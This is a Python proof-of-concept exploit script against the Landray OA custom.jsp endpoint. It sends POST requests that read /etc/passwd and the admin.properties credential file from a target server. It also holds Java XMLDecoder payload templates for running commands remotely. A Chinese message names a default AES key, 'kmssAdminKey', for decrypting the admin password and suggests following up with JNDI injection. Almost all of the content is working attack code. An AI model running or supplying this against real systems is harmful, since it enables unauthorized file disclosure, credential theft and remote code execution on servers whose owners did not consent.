import time
import requests
import urllib3
from rich.console import Console

payload_template_processbuilder = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="{0}">Template</array> <void method="start" id="process"> </void> </void> </java>'
payload_template_runtime = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <object class="java.lang.Runtime" method="getRuntime"> <void method="exec"> <array class="java.lang.String" length="{0}"> Template </array> </void> </object> </java>'

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding":"gzip",
        }
    data = 'var={"body": {"file": "file:///etc/passwd"}}'
    data1 = 'var={"body": {"file": "/WEB-INF/KmssConfig/admin.properties"}}'
    exp_url = target_url+"/sys/ui/extend/varkind/custom.jsp"
    console.print(now_time() + " [INFO]     正在检测蓝凌OA custom.jsp 任意文件读取漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.post(exp_url, headers=headers, data=data,verify=False)
        respones2 = requests.post(exp_url, headers=headers, data=data1,verify=False)
        if (respones1.status_code == 200 and 'root:' in respones1.text) or (respones2.status_code == 200 and 'password' in respones2.text):
            console.print(now_time() + ' [SUCCESS]  蓝凌OA custom.jsp 任意文件读取漏洞存在:{}'.format(exp_url), style='bold green')
            console.print(now_time() + ' [SUCCESS]  post输入的参数为:{}'.format(data), style='bold green')
            console.print(now_time() + ' [SUCCESS]  post输入的参数为:{}'.format(data1), style='bold green')
            console.print(now_time() + ' [SUCCESS]  请手工测试返回值，若存在admin.properties AES加密，且 默认密钥为 kmssAdminKey 登录后台可进行jndi注入测试', style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  蓝凌OA custom.jsp 任意文件读取漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
   
